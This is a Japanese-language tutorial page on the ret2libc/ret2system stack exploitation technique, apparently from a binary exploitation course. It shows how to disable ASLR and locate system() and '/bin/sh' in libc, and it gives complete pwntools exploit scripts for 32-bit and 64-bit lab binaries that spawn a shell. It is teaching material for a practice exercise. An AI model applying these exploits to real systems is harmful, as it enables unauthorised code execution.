---
description: The standard ROP exploit
---

# ret2libc/ret2system

ret2libc(ret2system とも呼ばれます)は、C ライブラリにある `system` 関数を利用するものです。この関数は渡されたものを何でも実行するため、最高の標的になります。libc にはもう 1 つ、文字列 `/bin/sh` も含まれています。この文字列を `system` に渡せば、シェルが起動します。

基本はこれだけで、`/bin/sh` を `system` のパラメータとして渡すのです。それほど難しくなさそうですよね。

{% file src="../../../.gitbook/assets/ret2libc (1).zip" %}
ret2libc
{% endfile %}

## ASLR を無効にする

まず、ASLR を無効にします。ASLR は libc のメモリ上の位置をランダム化するため、(他の手順なしには)`system` や `/bin/sh` の位置を求められません。全体の理論を理解するために、まずは無効にして始めます。

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## 手動でのエクスプロイト

### libc とそのベースアドレスを取得する

幸い、Linux には動的リンク用の `ldd` というコマンドがあります。コンパイルした ELF ファイルに対して実行すると、使っているライブラリとそのベースアドレスが分かります。

```
$ ldd vuln-32 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
	/lib/ld-linux.so.2 (0xf7fd3000)
```

必要なのは `libc.so.6` なので、libc のベースアドレスは `0xf7dc2000` です。

{% hint style="info" %}
libc のベースアドレスや system、/bin/sh のオフセットは、環境によって異なる場合があります。それは問題ではありません。libc のバージョンが違うだけです。必ず**自分の**値を使ってください。
{% endhint %}

### system() の位置を取得する

system を呼び出すには、当然そのメモリ上の位置が必要です。これには `readelf` コマンドが使えます。

```
$ readelf -s /lib32/libc.so.6 | grep system

1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
```

`-s` フラグは、`readelf` に関数などのシンボルを探させます。ここから、libc のベースから system までのオフセットは `0x44f00` と分かります。

### /bin/sh の位置を取得する

`/bin/sh` はただの文字列なので、`ldd` で見つけた動的ライブラリに対して `strings` が使えます。文字列をパラメータとして渡すときは、C がそう期待しているため、文字列の 16 進表現ではなく、文字列への**ポインタ**を渡す必要があります。

```
$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
18c32b /bin/sh
```

`-a` はファイル全体をスキャンさせるオプションで、`-t x` はオフセットを 16 進数で出力させるオプションです。

### 32-bit のエクスプロイト

```python
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

### 64-bit のエクスプロイト

64-bit のエクスプロイトにリンクされている `libc`(`/lib/x86_64-linux-gnu/libc.so.6` のような名前のはずです)で、同じ手順を繰り返します。

注意点として、リターンポインタの後ろにパラメータを置く代わりに、`pop rdi; ret` ガジェットを使って RDI レジスタに値を入れる必要があります。

```
$ ROPgadget --binary vuln-64 | grep rdi

[...]
0x00000000004011cb : pop rdi ; ret
```

```python
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```

## Pwntools で自動化する

当然ながら、pwntools にはこれをずっと簡単にする機能がたくさんあります。

```python
# 32-bit
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

64-bit でも、ほぼ同じ形になります。

{% hint style="info" %}
Pwntools の ROP 機能を使えば、さらに簡略化できますが、ここでは紹介しません。
{% endhint %}
